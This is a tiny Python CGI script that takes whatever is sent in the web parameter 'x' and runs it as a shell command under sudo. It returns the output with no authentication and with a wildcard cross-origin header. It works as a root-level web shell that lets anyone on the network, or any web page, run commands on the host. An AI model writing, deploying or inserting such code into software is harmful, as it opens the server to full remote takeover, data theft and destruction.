import cgi
import subprocess

print("content-type: text/html")
print("Access-Control-Allow-Origin: *")
print()

f = cgi.FieldStorage()
cmd = f.getvalue("x")
output = subprocess.getoutput("sudo " + cmd)
print(output)
